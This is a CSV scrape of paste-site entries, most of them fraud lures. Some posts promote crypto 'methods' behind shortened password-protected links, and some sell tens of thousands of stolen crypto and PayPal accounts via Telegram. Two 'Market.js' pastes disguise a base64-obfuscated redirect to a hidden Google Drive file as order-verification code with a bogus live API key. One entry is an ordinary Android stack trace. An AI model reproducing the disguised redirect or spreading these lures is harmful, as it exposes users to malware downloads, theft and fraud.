id,title,username,language,date,content
dLx1WGvG,Abuse RBF in BTC transactions,reflezzzz,JavaScript,Sunday 4th of May 2025 07:06:29 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 93044
tsuGvhvk,Market.js,WassupDog45,JavaScript,Sunday 4th of May 2025 07:05:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49666/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
R2ZcEhTP,Crypto Accounts,navrajkhunger,JavaScript,Sunday 4th of May 2025 07:05:34 AM CDT,78378 Accounts Posted On https://t.me/leakzbyeminem
kzeHdwkw,Make $1000 15-MINUTES (BEGINNER) L4,Fareswww511,JavaScript,Sunday 4th of May 2025 07:03:30 AM CDT," 
Pdf https://tinyurl.com/freshleaks

6TLHvsjxLu
"
nkLJmfcm,2025-05-04T14:00:40.654,powerampache,PHP,Sunday 4th of May 2025 07:00:41 AM CDT,"1.01-76 (76) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:938)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loop(Looper.java:236)
	at android.app.ActivityThread.main(ActivityThread.java:8061)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:656)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:967)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[],""suppressedExceptions"":[]}"
bEcwsqkY,EARN $900 INSTANTLY 2025⭐ GV,Fareswww511,JavaScript,Sunday 4th of May 2025 06:54:15 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Jyz7xVrzFm
"
1r6dSX5K,Stake Free Balance Method,reflezzzz,JavaScript,Sunday 4th of May 2025 06:51:07 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 61861
FurX6cDx,Untitled,WassupDog45,JavaScript,Sunday 4th of May 2025 06:50:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13205/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jRT0Rpbq,PayPal with Balance,navrajkhunger,JavaScript,Sunday 4th of May 2025 06:50:13 AM CDT,30338 Accounts Posted On https://t.me/leakzbyeminem
1YejZcx4,Make $1000 15-MINUTES  (BEGINNER) YR,Fareswww511,JavaScript,Sunday 4th of May 2025 06:45:01 AM CDT," 
Pdf https://tinyurl.com/freshleaks

NEtxw4hLBP
"
